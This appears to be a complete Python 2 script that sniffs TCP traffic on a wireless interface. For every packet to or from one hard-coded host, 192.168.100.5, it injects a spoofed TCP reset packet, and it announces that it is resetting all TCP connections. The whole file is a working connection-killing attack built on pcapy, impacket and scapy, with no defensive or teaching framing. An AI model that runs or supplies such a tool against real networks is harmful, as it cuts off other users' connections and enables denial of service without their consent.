#!/usr/bin/python
import sys
import getopt
import pcapy
from scapy.all import send, IP, TCP
from impacket.ImpactDecoder import EthDecoder, IPDecoder
from impacket.ImpactDecoder import TCPDecoder
dev = "wlan0"
filter = ""
eth_decoder = EthDecoder()
ip_decoder = IPDecoder()
tcp_decoder = TCPDecoder()
def handle_packet(hdr, data):
	eth = eth_decoder.decode(data)
	ip = ip_decoder.decode(eth.get_data_as_string())
	tcp = tcp_decoder.decode(ip.get_data_as_string())

	#print "source ip is ==>"+str(ip.get_ip_src())

	print "dst is ==>"+str(ip.get_ip_dst())

	if  tcp.get_ACK() and str(ip.get_ip_dst()) == '192.168.100.5' or str(ip.get_ip_src()) == '192.168.100.5':
		print 'hurray=>'+str(tcp.get_ACK())
		packet = IP(src=ip.get_ip_dst(),dst=ip.get_ip_src()) / TCP(sport=tcp.get_th_dport(),dport=tcp.get_th_sport(),seq=tcp.get_th_ack(),ack=tcp.get_th_seq()+1,flags="R")
		send(packet, iface=dev)
		print "RST %s:%d -> %s:%d" % (ip.get_ip_src(),tcp.get_th_sport(),ip.get_ip_dst(),
			tcp.get_th_dport())


pcap = pcapy.open_live(dev, 1500, 0, 100)
filt='tcp'

pcap.setfilter(filt)
print "Resetting all TCP connections .."#%s " + matching filter "%s  % (dev, filter"
pcap.loop(0, handle_packet)

